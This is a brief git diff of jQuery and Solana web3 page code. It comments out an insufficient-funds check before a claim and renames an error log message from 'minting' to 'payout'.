@@ -22,10 +22,10 @@ $(document).ready(function() {
       const minBalance = await connection.getMinimumBalanceForRentExemption(0);
 alert(`Minimum balance for rent exemption: ${minBalance / solanaWeb3.LAMPORTS_PER_SOL} SOL`);
 
-                if (walletBalance < minBalance) {
+              /**   if (walletBalance < minBalance) {
                     alert("Insufficient funds to claim.");
                     return;
-                }
+                }*/
   } catch (err) {
     console.error("Error found:", err);
     alert("Error: " + err.message);
@@ -62,7 +62,7 @@ alert(`Minimum balance for rent exemption: ${minBalance / solanaWeb3.LAMPORTS_PE
                         await connection.confirmTransaction(txid);
                         alert("Transaction confirmed:", txid);
                     } catch (err) {
-                        console.error("Error during minting:", err);
+                        console.error("Error during payout:", err);
                     }
                 });
             } catch (err) {
